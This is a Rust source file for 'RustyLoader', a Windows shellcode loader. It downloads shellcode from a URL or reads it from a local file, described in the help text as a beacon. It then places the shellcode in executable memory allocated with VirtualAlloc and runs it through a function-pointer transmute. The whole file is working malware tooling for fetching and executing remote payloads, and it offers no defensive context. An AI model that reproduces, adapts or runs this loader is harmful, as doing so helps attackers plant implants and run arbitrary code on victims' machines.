use std::{
    fs::{self},
    io,
    ffi::c_void,
};

use clap::{Command, ArgMatches, Arg};

use reqwest::blocking;

use bytes::{Bytes};
use windows::Win32::System::{ 
    Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
};

fn check_string_type(input: &str) -> &str {
    if input.starts_with("http://") || input.starts_with("https://") {
        "URL"
    } else {
        "File"
    }
}


fn get_shellcode_from_url(url_path: &str) -> Bytes {
    let client = blocking::Client::new();
    let res = client.get(url_path).send().expect("Failed to send GET request");
    let bytes = res.bytes().expect("Failed to read as bytes");
    println!("Done...");
    bytes
}

fn exec_shellcode(shellcode: &[u8]) -> io::Result<()> {
    unsafe {
        let size = shellcode.len();
        let exec_mem = VirtualAlloc(
            None,
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE,
        );
        if exec_mem.is_null() {
            return Err(io::Error::last_os_error());
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), exec_mem as *mut u8, size);

        let shell_exec: fn() = std::mem::transmute(exec_mem as *const c_void);

        shell_exec();

        // VirtualFree(exec_mem, 0, MEM_RELEASE);
    }
    Ok(())
    
}


fn main() -> Result<(), Box<dyn std::error::Error>>{

    let matches = Command::new("RustyLoader")
    .arg(
        Arg::new("path")
            .short('p')
            .long("path")
            .help("URL or Local file path to beacon. URL must point to the file containing shellcode")
            .required(true)
    ).arg(
        Arg::new("process")
            .short('P')
            .long("process")
            .help("Path to process")
            .required(false)
    );

    let found: ArgMatches = matches.get_matches();
    
    let shellcode_path = found.get_one::<String>("path").unwrap();

    let shellcode = if check_string_type(shellcode_path) == "URL" {
        println!("Getting shellcode bin from URL...");
        get_shellcode_from_url(shellcode_path)
    } else {
        // If local file, read the file and convert it to `Bytes`:
        println!("Getting shellcode from local file...");
        let data = fs::read(shellcode_path).expect("Failed to read file");
        println!("Done...");
        Bytes::from(data)       
    };

    println!("Executing shellcode using transmute...");
    exec_shellcode(&shellcode)?;
    Ok(())
    
}